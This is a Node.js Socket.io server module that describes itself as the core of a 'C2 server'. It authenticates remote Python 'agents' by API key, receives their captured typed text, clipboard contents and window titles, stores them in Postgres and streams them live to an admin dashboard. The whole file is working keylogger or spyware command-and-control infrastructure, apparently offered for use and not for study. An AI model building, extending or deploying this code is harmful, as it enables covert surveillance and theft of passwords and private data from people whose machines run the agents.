// src/sockets/index.js
// Wires up Socket.io namespaces: /agent (Python clients) and /admin (Dashboard).
// This is the real-time heart of the C2 server.

const prisma = require('../utils/prisma');
const { verifyToken } = require('../utils/jwt');
const logger = require('../utils/logger');

// Valid log types — mirrors the Prisma enum
const VALID_LOG_TYPES = new Set(['text', 'clipboard', 'system']);

/**
 * Authenticates a Socket connection using the X-Agent-API-Key handshake header.
 * Returns the Agent DB record on success, throws on failure.
 */
const authenticateAgent = async (socket) => {
  const apiKey =
    socket.handshake.headers['x-agent-api-key'] ||
    socket.handshake.auth?.api_key; // Allow auth object as fallback

  if (!apiKey) throw new Error('Missing API key');

  const agent = await prisma.agent.findUnique({ where: { api_key: apiKey } });
  if (!agent) throw new Error('Invalid API key');

  return agent;
};

/**
 * Authenticates a Socket connection using a JWT in the Authorization header or auth object.
 * Returns decoded JWT payload on success, throws on failure.
 */
const authenticateAdmin = (socket) => {
  const authHeader = socket.handshake.headers['authorization'];
  const tokenFromAuth = socket.handshake.auth?.token;

  const raw = authHeader?.startsWith('Bearer ') ? authHeader.split(' ')[1] : tokenFromAuth;

  if (!raw) throw new Error('Missing token');

  return verifyToken(raw); // throws JsonWebTokenError / TokenExpiredError
};

/**
 * Registers all Socket.io namespaces and their event handlers.
 * @param {import('socket.io').Server} io
 */
const registerSockets = (io) => {
  // ══════════════════════════════════════════════════════════════════════════
  // /agent NAMESPACE — Python Agent connections
  // ══════════════════════════════════════════════════════════════════════════
  const agentNs = io.of('/agent');

  agentNs.use(async (socket, next) => {
    try {
      const agent = await authenticateAgent(socket);
      socket.data.agent = agent; // Attach for use in event handlers
      next();
    } catch (err) {
      logger.warn('Agent socket auth rejected', {
        socketId: socket.id,
        reason: err.message,
        ip: socket.handshake.address,
      });
      next(new Error(`Authentication failed: ${err.message}`));
    }
  });

  agentNs.on('connection', async (socket) => {
    const agent = socket.data.agent;

    logger.info('Agent connected', {
      agentId: agent.id,
      hostname: agent.hostname,
      socketId: socket.id,
    });

    // Mark agent as online
    await prisma.agent.update({
      where: { id: agent.id },
      data: { status: 'online', last_seen: new Date() },
    });

    // Notify admin dashboard that this agent came online
    io.of('/admin').emit('agent_status', {
      agent_id: agent.id,
      hostname: agent.hostname,
      status: 'online',
      last_seen: new Date().toISOString(),
    });

    // ── new_log ─────────────────────────────────────────────────────────────
    // Primary data pipeline: agent emits a single log event.
    // 1. Validate  2. Persist async  3. Broadcast to /admin
    socket.on('new_log', async (data, ack) => {
      try {
        const { window_title, log_type, content, metadata, timestamp } = data || {};

        // Input validation
        if (!content || !VALID_LOG_TYPES.has(log_type)) {
          const errMsg = `Invalid log payload. 'content' is required and 'log_type' must be one of: ${[...VALID_LOG_TYPES].join(', ')}`;
          logger.warn('Agent sent invalid log', { agentId: agent.id, log_type, hasContent: !!content });
          if (typeof ack === 'function') ack({ ok: false, error: errMsg });
          return;
        }

        // ① Persist to Postgres (non-blocking — we don't await before broadcasting)
        const savePromise = prisma.log
          .create({
            data: {
              agent_id: agent.id,
              timestamp: timestamp ? new Date(timestamp) : new Date(),
              window_title: window_title || null,
              log_type,
              content,
              metadata: metadata || undefined,
            },
          })
          .then((saved) => {
            // Update agent heartbeat after successful save
            return prisma.agent.update({
              where: { id: agent.id },
              data: { last_seen: new Date() },
            });
          })
          .catch((err) => {
            logger.error('Failed to persist log', { agentId: agent.id, error: err.message });
          });

        // ② Broadcast to /admin immediately (before DB round-trip completes)
        const broadcastPayload = {
          agent_id: agent.id,
          agent_hostname: agent.hostname,
          window_title: window_title || null,
          log_type,
          content,
          metadata: metadata || null,
          timestamp: timestamp || new Date().toISOString(),
        };

        io.of('/admin').emit('new_log', broadcastPayload);

        // Acknowledge to the agent that we received it
        if (typeof ack === 'function') ack({ ok: true });

        // Await DB write (errors are caught inside the promise chain above)
        await savePromise;
      } catch (err) {
        logger.error('Error handling new_log event', { agentId: agent.id, error: err.message });
        if (typeof ack === 'function') ack({ ok: false, error: 'Server error' });
      }
    });

    // ── heartbeat ──────────────────────────────────────────────────────────
    socket.on('heartbeat', async () => {
      try {
        await prisma.agent.update({
          where: { id: agent.id },
          data: { last_seen: new Date() },
        });
      } catch (err) {
        logger.error('Heartbeat update failed', { agentId: agent.id, error: err.message });
      }
    });

    // ── disconnect ─────────────────────────────────────────────────────────
    socket.on('disconnect', async (reason) => {
      logger.info('Agent disconnected', { agentId: agent.id, hostname: agent.hostname, reason });

      try {
        await prisma.agent.update({
          where: { id: agent.id },
          data: { status: 'offline' },
        });

        // Notify dashboard
        io.of('/admin').emit('agent_status', {
          agent_id: agent.id,
          hostname: agent.hostname,
          status: 'offline',
          last_seen: new Date().toISOString(),
        });
      } catch (err) {
        logger.error('Failed to set agent offline on disconnect', { error: err.message });
      }
    });
  });

  // ══════════════════════════════════════════════════════════════════════════
  // /admin NAMESPACE — Next.js Dashboard connections
  // ══════════════════════════════════════════════════════════════════════════
  const adminNs = io.of('/admin');

  adminNs.use((socket, next) => {
    try {
      const decoded = authenticateAdmin(socket);
      socket.data.admin = decoded;
      next();
    } catch (err) {
      logger.warn('Admin socket auth rejected', {
        socketId: socket.id,
        reason: err.message,
        ip: socket.handshake.address,
      });
      next(new Error(`Authentication failed: ${err.message}`));
    }
  });

  adminNs.on('connection', (socket) => {
    const admin = socket.data.admin;

    logger.info('Admin dashboard connected', {
      adminId: admin.id,
      email: admin.email,
      socketId: socket.id,
    });

    // Allow admin to subscribe to a specific agent's stream
    socket.on('subscribe_agent', (agentId) => {
      socket.join(`agent:${agentId}`);
      logger.debug('Admin subscribed to agent', { adminId: admin.id, agentId });
    });

    socket.on('unsubscribe_agent', (agentId) => {
      socket.leave(`agent:${agentId}`);
    });

    socket.on('disconnect', (reason) => {
      logger.info('Admin dashboard disconnected', { adminId: admin.id, reason });
    });
  });

  logger.info('Socket.io namespaces registered: /agent, /admin');
};

module.exports = registerSockets;
